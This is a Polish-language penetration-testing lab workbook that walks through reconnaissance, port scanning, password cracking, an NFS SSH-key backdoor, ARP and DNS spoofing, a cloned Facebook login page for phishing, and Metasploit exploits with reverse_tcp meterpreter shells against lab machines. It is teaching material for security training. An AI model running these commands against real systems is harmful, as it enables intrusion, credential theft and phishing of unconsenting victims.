TESTY PENETRACYJNE - LAB
===
###### tags: `compendium` `pentest` 

![](https://i.imgur.com/EFAIQpZ.png? =300x300)

:::info
Copyright (c) 2017, Marcin Ziemczyk - Compendium Centrum Edukacyjne Sp. z o.o.
:::
# FOOTPRINTING I REKONESANS

## Ćwiczenie 1 - Whois
>**Zasoby:**
Dowolny klient whois

Za pomoca klienta **whois** odbytaj bazę. Porównaj wyniki dla domen `.pl` oraz domen `.com`

## Ćwiczenie 2 – TheHarvester
>**Zasoby:**
Kali Linux

Za pomocą skryptu theharvester zdobądź informacje o nazwach użytkowników, adresach danej organizacji/firmy.
1. Wyszukanie 500 pierwszych wyników dla wybranej domeny z pośród wszystkich dostępnych portali.
`# theharvester –d <domena> -l 500 –b all`

## Ćwiczenie 3 – Ping
>**Zasoby:**
Windows 7

Wyszukaj maksymalny rozmiar ramki:
1. Uruchom cmd
2. Użyj polecenia ping z odpowiednimi parametrami
`# ping <domena> -f –l <rozmiar>`
    :::info
    Manipuluj rozmiarem by ustalić maksymalny rozmiar ramki.
    :::
Za pomocą polecenia ping znajdź trasę do hosta
1. Uruchom cmd
2. Użyj polecenia ping z odpowiednimi parametrami
`# ping <domena> -i <TTL> –n 1`
3. Zmieniaj parametr TTL od 1 wzwyż by poznać trasę pakietu.

## Ćwiczenie 4 - DNS
> **Zasoby:**
Kali Linux

Polecenie nslookup:
Uruchamiamy nslookup w trybie interaktywnym:
```
# nslookup
Default Server: 192.168.1.1
Address: 192.168.1.1
>> set type=a
>> www.firma.pl
name: www.firma.pl
address: 10.10.10.100
```
Polecenie host:
`# host –t [typ] <domena> [server]`
Polecenie dig:
```
# dig [@server] [-opcje] {name} [type]
# dig <target domain name> ns
```
#### Transfer strefy:
Dokonaj transferu strefy za pomocą poleceń host oraz dig. Jako domeny użyj zonetransfer.me
1. Transfer strefy za pomocą polecenia host
`# host –l –v –t any <domena> <server>`
2. Transfer strefy za pomocą polecenia dig
`# dig @<server> <domena> axfr > dig_zone.txt`

## Ćwiczenie 5 – Google Hacking
> **Zasoby:**
Kali Linux
1. Komenda „allinurl” służy do wyszukiwania łańcucha znaków w adresie URL
    `allinurl: Compendium Faq`
2. Wyszukiwanie indexów:
```
    „Index of /admin”
    „Index of /cgi-bin” site:org
```
3. Wyszukiwanie konkretnych typów plików:
```
Filetype:pdf site:pl kontakty
Filetype:xlsx site:pl pracownicy
```
4. Zaawansowane wyszukiwanie:
```
Inurl:password.txt
Allinurl:passwd.txt site: <nazwa strony>
„index of /” + passwd.txt
Query: allinurl:/.bash_history
```
5. Z pomocą google-dorks dokonaj zaawansowanego wyszukiwania interesujących rzeczy dla wybranej domeny.
http://www.exploit-db.com/google-dorks

## Ćwiczenie 6 – Discover
>**Zasoby:**
Kali Linux

Za pomocą skryptu discover zbierz informację o wybranej organizacji/firmie.
**Realizacja:**
1. Przejdź do katalogu `/opt/discover`
2. Uruchom Skrypt `./discover.sh`
3. Wybierz opcję `1. Domain`
4. Wybierz opcję `1. Passive`
5. Wpisz nazwę oraz domenę, którą chcesz przeanalizować.

# SKANOWANIE

## Ćwiczenie 1 – Wyszukiwanie aktywnych hostów
>**Zasoby:**
Kali Linux
1. Sprawdzenie dostępności adresów IP dla sieci klasy C 192.168.10.0 /24 przy pomocy programu fping
`# fping –a –g 192.168.1.1 192.168.1.254 > active_hosts.txt`
2. Skanowanie za pomocą programu nmap
`# nmap –sn 192.168.1.0/24`

## Ćwiczenie 2 - Skanowanie sieci przy pomocy programu nmap i hping
>**Zasoby:**
Kali Linux, Windows 7

**Skanowanie typu TCP connect**
Jest to podstawowa metoda, polegająca na nawiązaniu połączenia z każdym interesującym portem. Jeśli połączenie dojdzie do skutku oznacza to, że dany port jest otwarty, w przeciwnym wypadku port jest niedostępny. Podstawową zaletą tej metody jest szybkość (istnieje możliwość nawiązywania połączenia z wieloma portami równocześnie). Wadą tej metody jest oczywiście łatwość jej wykrycia.
**Skanowanie TCP connect:**
`# nmap –sT 192.168.1.25`
Skanowanie zakresu portów –p <zakres>:
`# nmap –sT –p 1-1024 192.168.1.25`
**Skanowanie typu Syn**
Skanowanie pakietami SYN, nazywane także skanowaniem "pół otwartym", umożliwia dowiedzenie się w jakim stanie jest dany port bez nawiązywania pełnego połączenia z hostem. W takim przypadku większość systemów nie zapisuje próby połączenia, lecz odrzuca je jako błędy w komunikacji. Przyglądając się każdemu pakietowi, można zgadnąć stan zdalnego portu i przerwać połączenie, nawet zanim zostanie nawiązane. Jeśli serwer odpowie pakietem syn/ack możemy z pewnością powiedzieć, że dany port jest w stanie "otwarty". Jeśli serwer odpowie pakietem rst, wtedy dany port jest w stanie "zamknięty". Jeśli serwer odpowiedział pakietem syn/ack, wiemy już, że port jest otwarty, odpowiadamy wtedy pakietem rst, aby zerwać połączenie zanim zostanie nawiązane.
:::warning
UWAGA !!!
Omawiana technika skanowania niesie ze sobą pewne ryzyko. Jeśli jakiś host jest skanowany zbyt długo oraz przy pomocy dużej liczby jednoczesnych połączeń istnieje prawdopodobieństwo "syn floodowania" danego hosta. Jest to wynik zapełniania tabeli połączeń serwera, a skutkiem tego jest brak możliwości obsługi kolejnych prób nawiązania połączenia (pochodzących od nas jaki innych użytkowników). Ten efekt uboczny został jednak usunięty w większości używanych systemów operacyjnych (kernel posiada limity na ilość prób połączeń z jednego adresu IP). Chociaż eliminuje to możliwość nieumyślnego zablokowania hosta, może spowodować problemy z funkcjonowaniem skanera. W przypadku skanowania dużej liczby portów w danym systemie, istnieje możliwość przekroczenia ilości dozwolonych półotwartych połączeń z danym hostem, co niestety zakończy skanowanie. By rozwiązać ten problem ogranicza się ilość skanowanych portów tylko do tych, które byłyby istotne podczas ataku.
:::
**Skanowanie w trybie półotwartym za pomocą programu Nmap:**
`# nmap –sS 192.168.1.25 –p 1-1024`
### Skanowanie przy pomocy Hping.
Przygotowujemy pakiet z ustawiona flaga SYN. Wysłanie pakietu na otwarty port spowoduje zwrócenie przez komputer docelowy SYN/ACK. **Jeśli nie zostanie zwrócony żaden pakiet, to można przyjąć, ze host jest chroniony firewallem lub port jest filtrowany.**
```
# hping3 -c 1 -S -8 25 XXX.XXX.XXX.XXX
Scanning XXX.XXX.XXX.XXX ( XXX.XXX.XXX.XXX ), port 25
1 ports to scan, use -V to see all the replies
+----+-----------+---------+---+-----+-----+-----+
|port| serv name | flags   |ttl| id  | win | len |
+----+-----------+---------+---+-----+-----+-----+
   25 smtp       : .S..A... 128 64665 64240   46
```
**Skanowanie typu XMAS, FIN, NULL**
Skanowania typu Xmas, FIN i NULL są jednymi z najbardziej zawodnych. Zawodne w tym sensie, że ilość rożnych wyników, które możemy otrzymać mogą spowodować uznanie przez skaner portu za otwarty, podczas gdy w rzeczywistości będzie on
zamknięty.
Skanowanie Xmas ustawia flagi kontrolne wyjściowych pakietów TCP na FIN ( <finish>), URG (<urgent>) i PSH (<push>). Skanowanie FIN to po prostu pakiet TCP z ustawioną flagą FIN, a skanowanie NULL jest zapoczątkowane pakietem nie mającym ustawionej żadnej flagi. Jeśli implementacja TCP/IP systemu jest rozwinięta na podstawie RFC 793, wtedy powyższy pakiet wysłany na otwarty port nie wywoła odpowiedzi ze strony skanowanego hosta. Jeśli port będzie zamknięty zdalny host odpowie pakietem RST/ACK. Z tego możemy wywnioskować, że jeśli jakiś port zostanie przeskanowany i nie dostaniemy żadnej odpowiedzi port ten jest otwarty.
:::warning
UWAGA !!!
Jedna z wad tej techniki skanowania została opisana wcześniej a mianowicie implementacja TCP/IP systemu MUSI być zgodna ze standardem RFC 793. A wiec, metoda ta nie zadziała przeciwko systemom Microsoft Windows. Skanowanie Xmas skierowane przeciwko jakiemukolwiek systemowi Microsoft pokaże wszystkie porty w stanie zamkniętym. Gdy system Microsoftu otrzymuje niepoprawny pakiet TCP , odpowie pakietem RST/ACK, obojętnie czy port jest zamknięty czy otwarty. Jako, że skanowanie typu Xmas interpretuje odpowiedź ze zdalnego hosta jako zamknięty port, system Microsoftu jest odporny na ta metodę skanowania, gdyż zobaczymy wszystkie porty jako zamknięte, bez względu na ich aktualny stan.
:::
**Skanowanie Xmas**
`# nmap -sX -p1-1024 192.168.1.25`
Skanowanie portu zamkniętego hping:
```
# hping3 XXX.XXX.XXX.XXX -c 1 -X -p 2
HPING XXX.XXX.XXX.XXX (eth1 XXX.XXX.XXX.XXX): X set, 40 headers
+ 0 data bytes
len=46 ip= XXX.XXX.XXX.XXX ttl=128 id=45285 sport=2 flags=RA
seq=0 win=0 rtt=0.6 ms
--- XXX.XXX.XXX.XXX hping statistic ---
1 packets transmitted, 1 packets received, 0% packet loss
round-trip min/avg/max = 0.6/0.6/0.6 ms
```
**Skanowanie FIN**
`# nmap –sF 192.168.1.25 –p 1-1024`
**Skanowanie NULL**
`# nmap –sN 192.168.1.25 –p 1-1024`
### Skanowanie bezczynne (ang. Idle)
Skanowanie Idle bazuje na dwóch założeniach:
1. Próba nawiązania połączenia TCP z portem na hoście poprzez wysłanie komunikatu SYN kończy się odpowiedzią SYN/ACK jeśli port jest otwarty, lub RST jeśli port jest zamknięty
2. Każdy pakiet posiada w nagłówku IP numer identyfikacyjny IPID. Niektóre systemy powiększają wartość IPID z każdym kolejnym wysłanym pakietem (najczęściej o 1). Analiza IPID daje wiedzę o ilości wysłanych pakietów przez dany host.

W celu znalezienia hosta który może posłużyć nam za host „zombie” można posłużyć się programem hping3:
```
# hping3 -c 5 XXX.XXX.XXX.XXX
HPING XXX.XXX.XXX.XXX (eth1 XXX.XXX.XXX.XXX): NO FLAGS are
set, 40 headers + 0 data bytes
len=46 ip= XXX.XXX.XXX.XXX ttl=128 id=48559 sport=0 flags=RA
seq=0 win=0 rtt=0.6 ms
len=46 ip= XXX.XXX.XXX.XXX ttl=128 id=48560 sport=0 flags=RA
seq=1 win=0 rtt=0.4 ms
len=46 ip= XXX.XXX.XXX.XXX ttl=128 id=48561 sport=0 flags=RA
seq=2 win=0 rtt=0.3 ms
len=46 ip= XXX.XXX.XXX.XXX ttl=128 id=48562 sport=0 flags=RA
seq=3 win=0 rtt=0.3 ms
6len=46 ip= XXX.XXX.XXX.XXX ttl=128 id=48563 sport=0 flags=RA
seq=4 win=0 rtt=0.3 ms
```
Jak widać pole id zwiększa się o 1.
Można również skorzystać z ***ipidseq*** który jest wbudowany w pakiet metasploit lub dostępny jest jako skrypt do nmap.
```
# nmap XXX.XXX.XXX.XXX --script ipidseq
Starting Nmap 7.12 ( https://nmap.org ) at 2016-05-27 03:03
EDT
Nmap scan report for XXX.XXX.XXX.XXX
Host is up (0.00060s latency).
Not shown: 989 closed ports
PORT
STATE SERVICE
21/tcp
open ftp
25/tcp
open smtp
79/tcp
open finger
80/tcp
open http
106/tcp open pop3pw
110/tcp open pop3
135/tcp open msrpc
139/tcp open netbios-ssn
443/tcp open https
445/tcp open microsoft-ds
3306/tcp open mysql
MAC Address: 00:0C:29:CD:DF:A9 (VMware)
Host script results:
|_ipidseq: Incremental!
```
Za pomocą skryptu dostajemy informacje że pole IPID jest inkrementowane, więc host ten może posłużyć za „zombie”. Gdy mamy już host „zombie” można przystąpić do skanowani.
Polega ono na 3 krokach powtarzanych dla każdego portu
1. Sprawdzenie IPID na hoście „zombie”
2. Wygenerowanie komunikatu SYN ze sfałszowanym adresem nadawcy, tak by
odpowiedź wróciła do komputera „zombie”. Gdy „zombie” odbierze komunikat SYN/ACK powiększy wartość IPID. W przypadku odebrania RST, odpowiedź nie zostanie wysłana, więc pole IPID nie zostanie powiększone.
3. Ponowne sprawdzenie wartości IPID na hoście „zombie”. Jeśli wartość IPID wzrosła, oznacza to port otwarty.
Do wykonania skanowania idle należy wydac następującą komendę:
`# nmap –Pn –sI <zombie host> <cel>`
`–Pn` – brak wysyłania sygnału ping, dzięki temu nigdzie w logach ofiary ani w ewentualnym systemie IDS, który posiada cel nie pojawi się informacja na temat prawdziwego źródła procesu skanowania. Jedynie może pojawić się tam informacja na temat naszego komputera „zombie”. 
`–sI` – skanowanie typu Idle
Wynik powinien być podobny do poniżeszego:
```
Starting Nmap 7.12 ( https://nmap.org ) at 2016-05-27 04:51
EDT
Idle scan using zombie XXX.XXX.XXX.XXX (XXX.XXX.XXX.XXX:80);
Class: Incremental
Nmap scan report for YYY.YYY.YYY.YYY
Host is up (0.051s latency).
Not shown: 994 closed|filtered ports
PORT
STATE SERVICE
1026/tcp open LSA-or-nterm
1027/tcp open IIS
1028/tcp open unknown
1029/tcp open ms-lsa
1036/tcp open nsstp
5357/tcp open wsdapi
```
Wyniki prześledzić za pomocą programu Wireshark.

# SKANERY

## Ćwiczenie 1 – Nessus
>**Zasoby:**
Kali Linux

Wykonaj skanowanie hosta za pomocą oprogramowania Nessus. Przeanalizuj otrzymane wyniki.

## Ćwiczenie 2 – OpenVAS
>**Zasoby:**
Kali Linux

Wykonaj skanowanie hosta za pomocą oprogramowania OpenVAS. Przeanalizuj otrzymane wyniki.


# ENUMERACJA PODATNOŚCI

## Ćwiczenie 1 – OS detection
>**Zasoby:**
Kali Linux

* Za pomocą programu p0f sprawdź jaki system operacyjny kryje się pod wybranym adresem.
`# p0f –i <interfejs> -p`

* Za pomocą programu nmap dokonaj skanowania w celu wykrycia systemu operacyjnego
`# nmap –O <adres IP>`

## Ćwiczenie 2- Enumeracja NetBIOS
>**Zasoby:**
Windows 10

Za pomocą programu Zenmap GUI przeskanuj host z systemem Windows w celu sprawdzenia czy porty 139 oraz 445 są otwarte.
`# nmap –O 192.168.10.11`
Następnie za pomocą programu ***Hyena*** przeskanuj host.
Zbadaj jakie informacje można uzyskać.

## Ćwiczenie 3- Banner grabbing
>**Zasoby:**
Kali Linux

W tym celu użyjemy nmap w raz ze skryptem banner-plus.nse (Tym skryptem HD Moore przeskanował i odwzorował cały internet). Pobierz skrypt ze strony github i umieść go w katalogu nmapa.
```
# cd /usr/share/nmap/scripts
# wget https://raw.github.com/hdm/scan-tools/master/nse/banner-
plus.nse
# nmap --script=banner-plus -p1-65535 -n -Pn -PS -oA report
XXX.XXX.XXX.XXX
```
`--script` – nazwa używanego skryptu
`p1-65535` – sprawdzanie wszystkich 65535 portów
`-n` – wyłączenie rozwiązywania adresów DNS (w celu przyśpieszenia skanowania. Można pominąć)
`-Pn` – wyłączenie ping
`-PS` – stosowanie TCP SYNPing
`-oA` – eksport do wszystkich rodzajów raportów

Z otrzymanych wyników przeanalizuj możliwe podatności na usługi.(searchsploit, Rapid7)


# WTARGNIĘCIE

:::warning
Przed wykonaniem każdego z ćwiczeń zalecane jest wykonanie snapshotu.
:::

## Ćwiczenie 1 - Łamanie haseł Windows
>**Zasoby:**
ISO Kali Linux ,Windows 7

W przykładzie zajmiemy się Windowsem 7 i spróbujemy złamać hasła systemowe użytkowników.
* Na komputerze uruchamiamy alternatywny system – my wykorzystamy system linux –
* Kali (podmontuj ISO i zmień kolejność bootowania za pomocą F2).
* Uruchamiamy system linux jako Live.
* Po uruchomieniu montujemy partycję z systemem Windows:
`# mount /dev/sdaX /mnt`
:::info
Info:
X oznacza numer partycji
:::
* Wchodzimy do katalogu tmp i odczytujemy hash’e haseł:
```
# cd /tmp
# samdump2 –o hash.txt /mnt/Windows/system32/config/SYSTEM
/mnt/Windows/system32/config/SAM
```
:::danger
UWAGA!
Zwróć uwagę na wielkość liter w ścieżce!
W zależności od wersji systemu mogą się one różnić.
:::
* Możemy sprawdzić plik z hasłami:
`# cat hash.txt`
* Uruchamiamy program do łamania haseł. Wykorzystamy aplikację John The Ripper:
`# john –-format=NT hash.txt`
Jeśli hasło jest słownikowe zostanie złamane w pierwszej minucie. W przypadku trudniejszych haseł zostanie uruchomiony atak Brute Force.

## Ćwiczenie 2 - Łamanie haseł przy pomocy tablic tęczowych
>**Zasoby:**
ISO Ophcrack , Windows XP

Tak jak poprzednio spróbujemy złamać hasła systemu Windows XP. W tym przykładzie wykorzystamy tablice tęczowe oraz oprogramowanie **Ophcrack**. Oprogramowanie Ophcrack może być zainstalowane na praktycznie dowolnym systemie. Oczywiście musimy jeszcze ściągnąć interesujące nas tablice tęczowe. My skorzystamy z wersji bootowalnej Ophcrack, która zawiera w sobie tablicę tęczową stworzoną na podstawie haseł składających się z dużych i małych liter oraz cyfr.
* Na komputerze uruchamiamy alternatywny system – Ophcrack.
* Oprogramowanie automatycznie powinno odnaleźć partycję z systemem operacyjnym oraz zacząć łamać hasła.

## Ćwiczenie 3 - Łamanie haseł przy pomocy RainbowCrack
>**Zasoby:**
Windows 7

* Uruchom **rcrack_gui.exe** znajdujący się na pulpicie.
* Po uruchomieniu programu przejdź do `File -> Add Hash...`
* Otwórz plik z zapisanymi haszami programy Pwdump7 i skopiuj hasz do pola `Add Hashes.`
* W oknie programu RainbowCrack przejdź do `Rainbow Table -> Search Rainbow Tables...` i otwórz tablicę tęczową `ntlm_loweralph*` z folderu Winrtgen
* Program zacznie automatycznie łamać hasze za pomocą tablicy.

## Ćwiczenie 4 – Resetowanie haseł Windows
>**Zasoby:**
ISO Kali Linux , Windows XP, Windows 7

Na komputerze uruchamiamy alternatywny system – my wykorzystamy system linux - Kali.
Po uruchomieniu montujemy partycję z systemem Windows:
`# mount /dev/sda1 /mnt`
Do resetowania haseł Windowsowych skorzystamy z programu **chntpw**.

* Uruchamiamy program w trybie interaktywnym
`# chntpw –i /mnt/Windows/System32/config/SAM`
* Wybieramy użytkownika, wybieramy akcje (w naszym przypadku będzie to resetowanie hasła – warto wypróbować inne możliwości aplikacji) i wychodzimy z programu zapisując ustawienia w pliku SAM.
* Sprawdź dokonane przez Ciebie zmiany.

## Ćwiczenie 5 - Próby zgadnięcia haseł
>**Zasoby:**
Kali Linux , WinServer2008

Do testu zgadywania haseł usług sieciowych wykorzystamy program **Hydra**. 
Program wspiera bardzo dużą liczbę protokołów i jest jednym z najbardziej popularnych narzędzi do łamania haseł. Obsługuje protokoły: Samba, FTP, POP3, IMAP, Telnet, HTTP, LDAP, MySQL, VNC, Cisco i wiele innych. Zawiera również wsparcie dla protokołu SSL.
**Łamanie hasła do serwera FTP:**
```
# hydra -l <login> -P <plik_haseł> -t
<ilość_rownoczesnych_sesji> -w <timeout> <proto>://<ip>
```
np.:
```
# hydra -l john -P /usr/share/wordlists/dirb/szkolenie.txt ftp://<ip>
```
## Ćwiczenie 5a - Atak na formularz http-post
>**Zasoby:**
Kali Linux , metasploitable2

Za pomocą oprogramowania hydra oraz słownika spróbujemy dostać się do panelu admina w usłudze dvwa. W tym celu wykonamy atak na login i hasło w formularzu http-post.

1. Otwórz przeglądarke w systemie Kali i wejdź na stronę ***<metasploitable IP>/dvwa/login.php***
2. Otwórz program **BurpSuite** by przechwycić jakie informacje przesyłane są do serwera.
3. Skonfiguruj przeglądarkę Firefox by używała proxy **127.0.0.1:8080**. *Preferences -> Advanced -> Network -> Settings -> Manual proxy conf.*
4. W programie BurpSuite przejdź do zakładki Proxy
5. Jeśli dobrze skonfigurowałeś proxy oraz włączone jest przechwytywanie pakietów w BurpSuite (Intercept is on) przy kolejnym wejściu na stronę i wypełnieniu formularza, BurpSuite powinien przechwycić dane przesyłane do sewera. 
6. W tym przykładzie interesuje nas składnia zapytania, np:
`username=test&password=test&Login=Login` 
7. Otwórz program xHydra i wypełnij następujące pola:
    - **Target** 
            - Single Target: `<adres ip metasploitable>`
             - Protocol: `http-post-form`
             - Zaznacz box: `Show Attempts`
    - **Passwords** 
            -  Username: `admin`
             - Password List: `/use/share/wordlists/metasploit/unix_passwords.txt`
                - Zaznacz box: `Try login as password, Try empty password`
    - **Tunning** 
             -  Number of Tasks: `1`
             - Zaznacz box: `Exit after first found pair`
    - **Specific**
            - http/https url: `/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login Failed`
    - **Start**
            - Klikamy `start`. W oknie wyświetlane będą kolejne próby aż do momentu znalezienia prawidłowego hasła.


## Ćwiczenie 6 – Nieprawidłowa konfiguracja usługi
>**Zasoby:**
Kali Linux , metasploitable2

Jednym z najczęstszych błędów popełnianych przez administratorów systemów Linux jest błędna konfiguracja usług które są uruchomione na serwerze.
W tym ćwiczeniu wykorzystamy błąd w konfiguracji usługi NFS, umożliwiający wydostanie sie z poza udostępnionego udziału.

* Z poziomu systemu Kali uruchamiamy nmap w celu znalezienia otwartego portu z usługą NFS na systemie ofiary:
`# nmap –p0-65535 <metasploitable2 IP>`
* Gdy widzimy działającą usługę NFS, wyświetlamy listę wszystkich katalogów wyeksportowanych z maszyny za pomocą polecenia **showmount**:
`# showmount –e <metasploitable2 IP>`
* W przypadku gdy dostaniemy odpowiedź:
`/*`
Oznacza to że główne drzewo plików (/) jest udostepnione wszystkim (*).
* Skoro mamy dostęp do całego systemu plików, dodamy własny klucz SSH by w każdym momencie móc się zalogować do systemu. W tym celu tworzymy katalog tymczasowy w którym zamontujemy udział i dokleimy własny klucz ssh do pliku authorized_keys:
    ```
    # mkdir /tmp/mnt
    # mount –t nfs –o nolock <metasploitable2 IP>:/ /tmp/mnt
    # cat .ssh/id_rsa.pub >> /tmp/mnt/root/.ssh/authorized_keys
    ```
* Teraz możemy sprawdzić połączenie:
`# ssh <metasploitable2 IP>`
* Gdy mamy juz powłokę z uprawnianiami roota, jesteśmy panem tego systemu.

Sprawdź również udostępniony udział nfs za pomocą skryptu nmap **nfs-showmount**.

## Ćwiczenie 7 – Łamanie haseł w systemach Linux
>**Zasoby:**
Kali Linux , metasploitable2

* Ponownie montujemy system plików metasploitable2.
* Kopiujemy pliki passwd oraz shadow do systemu Kali.

:::warning
UWAGA!
Zwróć uwagę na kropkę na końcu polecenia
:::

`# cp /tmp/mnt/etc/{passwd,shadow} .`
* Za pomocą narzędzia unshadow łączymy oba pliki i zapisujemy:
`# unshadow passwd shadow > hash.txt`
* Następnie z użyciem narzedzia **John the Ripper** krakujemy:
`# john hasz.txt`

## Ćwiczenie 8 – atak MITM, arp spoofing
>**Zasoby:**
Kali Linux , WinServer2008, Windows 10

Aby przetestować działanie ataku typu Arp Spoofing wykorzystamy program **arpspoof**, dostępny w systemie Kali Linux.
Na początku należy ustawić, by system przekazywał pakiety. W tym celu ustawiamy
parametr `ip_forward na 1`:
`# echo 1 > /proc/sys/net/ipv4/ip_forward`
Lub za pomocą sysctl, gdzie należy odkomentować linijkę:
`#net.ipv4.ip_forward=1`
Oraz wykonać:
`#sysctl –p`

Zanim przystąpimy do zatruwania tablic ARP, zwróćmy uwagę jakie adresy MAC są przypisane do konkretnych adresów IP:
`# arp –a`

* Aby rozpocząć proces zatruwania korzystamy z narzędzia arpspoof:
`# arpspoof –i <interfejs> -t <cel> <adres pod jaki się
podszywamy>`
np:
`# arpspoof –i eth0 –t 192.168.1.25 192.168.1.15`
Po uruchomieniu, program natychmiast rozpocznie rozsyłanie komunikatów ARP.
Aby mieć możliwość przechwycenia ruchu pomiędzy dwoma maszynami, musimy przekonać drugiego hosta by przesyłał ruch do nas. W tym celu uruchamiamy kolejne okno terminala i wykonujemy polecenie arpspoof, z tym że teraz adres celu będzie adresem pod który się podszyjemy. Np.:
`# arpspoof –i eth0 –t 192.168.1.15 192.168.1.25`
Należy teraz spojrzeć na tablice ARP i porównać wyniki z wynikami z przed ataku.
* Teraz, zalogujmy się na serwer ftp z poziomu w7 i za pomocą programu Wireshark przechwyćmy dane logowania:
np:
```
ftp 192.168.1.15
User: John
Password:
```
:::info
Aby przefiltrować wyniki tylko dla pakietów ftp, w pasku filtru wpisz:
`tcp.port == 21`
:::

## Ćwiczenie 9 – DNS Cache Poisoning
>**Zasoby:**
Kali Linux , WinServer2012

Oprócz ataku na tablicę ARP możemy wykonać także atak polegający na zatruciu bazy danych DNS , dzięki któremu możemy przekierować ruch adresowany do konkretnej domeny na inną domena, kontrolowaną przez nas.

Do przeprowadzenia takiego ataku potrzebny będzie serwer Apache który będzie serwował nasza stronę www:
`# service apache2 start`
Dla przykładu możemy zmienić sobie domyślną stronę www.
Zmieńmy zawartośc pliku `/var/www/html/index.html` np na:
```
<h1>
DNS Spoofed!
</h1>
```
Przed przeprowadzeniem ataku musimy przygotować plik, w którym znajdą się informacje o rekordach DNS które chcemy sfałszować i gdzie powinien zostać przekierowany ruch. Przykładowy plik:
```
# cat hosts.txt
192.168.1.10 www.gmail.com
```
***Do wykonania zatrucia musimy najpierw zatruć tablice ARP dla systemu ofiary oraz bramy sieciowej.***
Teraz możemy użyć narzędzia dnsspoof dzięki któremu będziemy wysyłać sfaszowane odpowiedzi DNS:
`# dnsspoof -i <interfejs> -f hosts.txt`
Wykonanie zapytania nslookup dla adresu gmail.com z poziomu systemu ofiary, powinien przynieść w odpowiedzi adres naszego systemu.

## Ćwiczenie 10 - SET + ettercap dns spoofingu
>**Zasoby:**
Kali Linux , WinServer2012

Celem tego ćwiczenia będzie sklonowanie wybranej strony I wykonanie ataku dns spoofing za pomocą program ettercap.
:::success
**SET**
Sklonuj wybraną stronę www (w tym ćwiczeniu przykładem będzie strona logowania serwisu facebook.com) za pomocą programu SET i przekieruj witrynę na adres IP systemu Kali Linux.
:::
**ETTERCAP**
1. Dokonaj edycji pliku `etter.conf`
`/etc/ettercap/etter.conf`
I zmień uprawnienia na wartość 0.
```
ec_uid 0
ec_gid 0
```
2. Nadaj uprawnienia dla pliku etter.dns
`sudo chmod 777 /etc/ettercap/etter.dns`
3. W tym samym pliku wpisz nazwę sklonowanej strony (zamiast domyślej microsoft) i adres swojego system Kali Linux.
```
facebook.com     A      192.168.1.20
*facebook.com    A      192.168.1.20
www.facebook.com PTR    192.168.1.20
```
4. Włączamy program ettercap w trybie graficznym (przełącznik –G)
`ettercap –G`
W oknie `Sniff -> Unified sniffing...` Wybierz odpowiedni interfejs sieciowy
5. Zobacz jakie urządzenia są podłączone do twojej sieci wykonując skan `Hosts -> Scan for hosts`. Dostępne hosty możesz zobaczyć w `Hosts -> Hosts list`
6. Podaj adres bramy jako Cel 1 klikając `Add to target 1` oraz system Windows7 jako cel 2. W zakładce `Targets -> Current targets` możesz zobaczyć wybrane cele.
7. W zakładce `Plugins -> Manage the plugins` aktywuj dns_spoof klikając dwa razy.
8. Uaktywnij zatruwanie ARP przechodząc do `Mitm -> ARP poisoning` a następnie zaznacz `Sniff remote connections`
9. Rozpocznij atak 
`Start -> Start sniffing`
10. W wybranym systemie celu, przejdź pod adres sklonowanej strony i spróbuj się zalogować. 

Program SET powinien przechwycić wpisane przez nas dane logowania.

## Ćwiczenie 11 - Client side attack
>**Zasoby:**
Kali Linux , Windows XP

Wykorzystamy podatność MS10-046 oraz aplikację Metasploit.
* Uruchamiamy konsole metasploita:
`# msfconsole`
* Szukamy interesującego nas exploita:
* Wybieramy exploit:
```
> search ms10_046
> use exploit/windows/browser/ms10_046_shortcut_icon_dllloader
```
* Sprawdzamy informacje na temat exploita:
`> info`
* Szukamy interesujący nas PAYLOAD:
`> show payloads`
* Wybieramy PAYLOAD np:
`> set PAYLOAD windows/meterpreter/reverse_tcp`
* Sprawdzamy jakie parametry musimy ustawić
`> show options`
* Ustawiamy parametry przy pomocy polecenia set:
    ```
    > set SRVHOST <IP>
    > set LHOST <IP>
    ```
* Jeśli wszystkie parametry są ustawione uruchamiamy exploita:
`> exploit`
* W tym momencie Metasploit uruchamia serwer www oraz pokazuje na jaki adres musimyskierować naszą ofiarę. Oczywiście aby dostarczyć ofierze link do naszego spreparowanego serwera możemy użyć różnych technik. Możemy bezpośrednio przesłać link do naszego serwera lub stworzyć skrót lnk do naszej strony www i podesłać plik np. wykorzystując Pendrive.
* Po podłączeniu ofiary przejmujemy jej komputer.
* Wyświetlamy dostępne sesje
`> sessions`
* Podłączamy się do sesji 1
`> sessions –i 1`
* Już jesteśmy na komputerze ofiary : >

## Ćwiczenie 12 – Atak na serwer MS SQL
>**Zasoby:**
Kali Linux , Windows Server 2012

W tym ćwiczeniu wyszukamy wszystkie hosty z uruchomioną bazą MSSQL. Spróbujemy sie do nich zalogować i otworzyć powłokę za pomocą exploita.
* Pierwszą czynnością, będzię zeskanowanie wszystkich dostępnych hostów pod względem uruchomionej usługi MS SQL Server. Za pomocą metasploita i modułu **mssql_ping**
wykonujemy skanowanie:
```
> use auxiliary/scanner/mssql/mssql_ping
> set RHOSTS 192.168.1.0/24
> set THREADS 8
> run
```
* W wyniku otrzymujemy hosty z usługą MS SQL w raz z dodatkowymi informacjami na temat wersji, portów itp.
Większośc serwerów MS SQL instalowanych jest z metodą uwierzytelnienia mixed, gdzie domyślnym użytkownikiem jest *„sa”*- często z prostym hasłem. Użyjemy więc metody słownikowej do złamania hasła.
* Do ataku użyjemy modułu metasploita **mssql_login** w raz z wygenerowanym słownikiem.
```
> use auxiliary/scanner/mssql/mssql_login
> set PASS_FILE /root/password.txt
> set USERNAME sa
> set THREADS 8
> set RHOSTS <WinServer2012 IP>
> set STOP_ON_SUCCESS true
> run
```
Jeśli krok ten zakończy sie powodzeniem, hasło dla użytkownika *‘sa’* zostanie odnalezione i możemy przejść do uruchomienia exploita:

```
> use exploit/windows/mssql/mssql_payload
> set RHOST <WindServer2012 IP>
> set PASSWORD <hasło>
> set PAYLOAD windows/meterpreter/reverse_tcp
> set LHOST <Kali IP>
> exploit
```
Po powodzeniu exploita oraz uruchomieniu ładunku powinnismy dostać powłokę meterpretera.
`meterpreter >`
Sprawdzamy nasze prawa dostępu i podnosimy je do uprawnień systemowych, migrując nasz proces np do procesu explorer.exe:
```
> getuid
> migrate <pid explorer.exe>
> getsystem
```
Uruchamiając powłokę mamy pełen dostęp do systemu:
`> shell`
## Ćwiczenie 13 – Atak na bazę danych MySQL
>**Zasoby:**
Kali Linux , Windows Server 2012

Za pomocą modułu **mysql_version** sprawdzimy wersję serwera MySQL:
```
> use auxiliary/scanner/mysql/mysql_version
> set RHOSTS <WinServer2012 IP>
> run
```
